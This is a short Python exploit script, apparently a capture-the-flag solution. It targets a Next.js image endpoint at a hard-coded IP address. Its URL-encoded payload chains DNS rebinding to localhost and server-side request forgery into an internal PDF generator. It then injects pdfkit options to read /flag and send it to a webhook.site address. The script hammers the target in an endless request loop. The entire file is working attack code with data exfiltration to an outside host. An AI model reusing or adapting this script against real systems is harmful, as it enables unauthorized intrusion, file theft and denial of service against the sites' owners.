import requests
import time

paylaod = "http%3A%2F%2F7f000001.8efac8ce.rbndr.us%3A5000%2Fgenerate%3Fdata%3Ddata%3Aplain%2Ftext%250AContent-Disposition%3A%253Cmeta%2520name%3D%2522pdfkit-post-file%2522%2520content%3D%2522%2522%253E%2520%253Cmeta%2520name%3D%2522pdfkit-leak-data%2522%2520content%3D%2522%2Fflag%2522%253E%2520%253Cmeta%2520name%3D%2522pdfkit-https%3A%2F%2Fwebhook.site%2F1738ce87-4a08-47ae-9cd5-323dc449cb7d%2F%3Fq%3D--%2522%2520content%3D%2522--cache-dir%2522%253E%2Ccanelo"

r =  f"http://165.227.157.69/_next/image?url={paylaod}&w=256&q=75&"

print("Attack started check your webhook")

while True:
    _ = requests.get(r)
    time.sleep(0.1)